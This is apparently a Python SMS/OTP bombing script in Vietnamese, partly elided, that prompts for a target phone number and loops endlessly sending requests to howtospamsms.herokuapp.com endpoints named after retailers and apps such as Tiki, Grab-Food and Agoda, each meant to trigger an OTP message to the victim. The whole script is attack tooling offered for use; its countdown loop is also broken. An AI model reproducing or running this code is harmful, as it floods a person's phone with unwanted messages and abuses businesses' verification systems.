...
Write.Print('Bản Quyền: Đặng Trung Kiên '+'\n' ,Colors.red_to_yellow, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_yellow, interval=0.005)
...
Write.Print('==========================================================================='+'\n' ,Colors.red_to_yellow, interval=0.005)
phone=Write.Input("Nhập SDT (Lưu Ý Bỏ Số 0 Ở Đầu Nhé:): " ,Colors.red_to_yellow, interval=0.005)
...
while True:
    ...
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP The-Gioi-Di-Dong"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Nhap-Hang-247"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Elines"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Meta-VN"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Bach-Hoa-Xanh"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Grab-Food"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Tiki"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Go2joy"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Vntrip"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Agoda"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    Write.Print(f"[ {stt} ] [ Đặng Trung Kiên Tool 2009] => Sen OTP Vieon"+" "+phone+"\n" ,Colors.red_to_yellow, interval=0.005)
    for i in range(120, 0):
            print(f"Vui Lòng Đợi 1 tí hihi:) {i}\r")